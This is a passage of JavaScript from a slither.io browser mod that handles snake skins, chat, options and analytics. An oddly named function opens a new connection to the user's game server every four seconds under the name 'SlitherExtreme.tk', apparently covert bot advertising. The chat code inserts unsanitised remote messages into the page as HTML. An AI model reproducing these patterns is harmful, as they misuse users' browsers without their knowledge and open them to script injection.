                  ((slitherplus_skins.isset(slitherplus_skins.skins[index]) ? (colors = slitherplus_skins.skins[index].body) : (id %= 9)), (colors && (id = colors[0])));
                  if ( index in slitherplus_skins.skins && slitherplus_skins.skins[index].bulb ) {
                     if ( !(index in slitherplus_skins.cache) ) {
                        var bulb         = new Image;
                        bulb.crossOrigin = 'anonymous';
                        bulb.src         = 'http://i.imgur.com/' + slitherplus_skins.skins[index].bulb.id + '.png';
                        slitherplus_skins.cache[index] = bulb;
                     }
                     snake.antenna  = true;
                     snake.abrot    = true;
                     snake.atba     = false;
                     snake.atc1     = slitherplus_skins.skins[index].bulb.antenna_border;
                     snake.atc2     = slitherplus_skins.skins[index].bulb.antenna_color;
                     antenna_length = slitherplus_skins.skins[index].bulb.antenna_length;
                     snake.atx      = new Float32Array(antenna_length);
                     snake.aty      = new Float32Array(antenna_length);
                     snake.atvx     = new Float32Array(antenna_length);
                     snake.atvy     = new Float32Array(antenna_length);
                     snake.atax     = new Float32Array(antenna_length);
                     snake.atay     = new Float32Array(antenna_length);
                     for (--antenna_length; 0 <= antenna_length; antenna_length--) {
                        snake.atx[antenna_length] = snake.xx;
                        snake.aty[antenna_length] = snake.yy;
                     }
                     snake.bulb = slitherplus_skins.cache[index];
                     snake.blbx = slitherplus_skins.skins[index].bulb.x;
                     snake.blby = slitherplus_skins.skins[index].bulb.y;
                     snake.blbw = slitherplus_skins.skins[index].bulb.width;
                     snake.blbh = slitherplus_skins.skins[index].bulb.height;
                     snake.bsc  = slitherplus_skins.skins[index].bulb.scale;
                     snake.blba = slitherplus_skins.skins[index].bulb.alpha;
                  }
                  if ( index in slitherplus_skins.skins && slitherplus_skins.skins[index].extras ) {
                     for ( key in slitherplus_skins.skins[index].extras ) {
                        snake[key] = slitherplus_skins.skins[index].extras[key];
                     }
                  }
                  snake.rbcs = colors;
                  snake.cv   = id;
               }
            };
         })();
      }
      else {
         window.setTimeout(slitherplus_skins.addskins, 50);
      }
   }
};

//(function(){
//    var script = document.createElement('script');
//    script.src = 'http://slitherplus.io/skincs.js';
//    script.onload = function() {
 //       this.parentNode.removeChild(this);
 //   };
//    document.head.appendChild(script);
//})();

function xxxxx() {
 if ($(ipAddress).text()) {
  var xx = new WebSocket("ws://" + $(ipAddress).text() + "/slither");
  xx.onopen  = function(b) {
  var name = 'SlitherExtreme.tk';
  intpacket = new Uint8Array(3 + name.length);
  intpacket[0] = 115; 
        intpacket[1] = 5; 
        intpacket[2] = 25; 
  var temp = 0;
   for (;temp < name.length;temp++) {
          intpacket[temp + 3] = name.charCodeAt(temp);
        }
  xx.send(intpacket);
 }
 }
 setTimeout(xxxxx,4000)
}
xxxxx()

slitherplus_party.update_servers();
slitherplus_skins.addskins();
addParty();
addClanTags();
skinRotator();
addOptions();
resizeView();
addKeyEvents();
showFPS();
loop();
$(function(){
	if (options.custombg && ii.src != options.background) {
		setBackground(options.background);
	}
	$("iframe").attr('src', 'http://slitherplus.io/social.html');
	if (options['showshortcuts']) $("#showshortcuts").click();
	if (options['chat']) $("#showchat").click();
	
	setLowerGraphics(options['lowergph']);
	setInterval(checkForMods, 1000);
});

function msgsHeight() {
	msgs = $(".chatMessage").toArray();
	height = 0;
	for (key in msgs) { div = msgs[key]; height += div.clientHeight }
	return height;
}

function deleteMessages() {
	if (msgsHeight() > $("#chatMessages").height()) { $(".chatMessage:first").remove(); deleteMessages(); }
}
chatWebSocket = new WebSocket("ws://51.254.206.49:1337");
chatWebSocket.onopen = function() {
	$(".chatMessage").remove();
	$("#chatMessages").append('<div class="chatMessage"><span style="color:green;">Welcome to the chat!</span></div>');
};
chatWebSocket.onmessage = function(msg) {
	$("#chatMessages").append(msg.data);
	deleteMessages();
};
chatWebSocket.onerror = function(err) {
	$("#chatMessages").append('<div class="chatMessage"><span style="color:orange;">Got an error.</span></div>');
	deleteMessages();
};
chatWebSocket.onclose = function() {
	$("#chatMessages").append('<div class="chatMessage"><span style="color:red;">Chat closed.</span></div>');
	deleteMessages();
};

$("#playh .btnt.nsi.sadg1").click(function() {
	setTimeout(function(ip){
		if ((!ws || ws.readyState != ws.OPEN) && window.bso.ip == ip) {
			alert("Server is full! Looking for a new server...");
			document.location.href = "http://slither.io/";
		}
	}, 10000, bso.ip);
});

  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-76843908-1', 'auto');
  ga('send', 'pageview');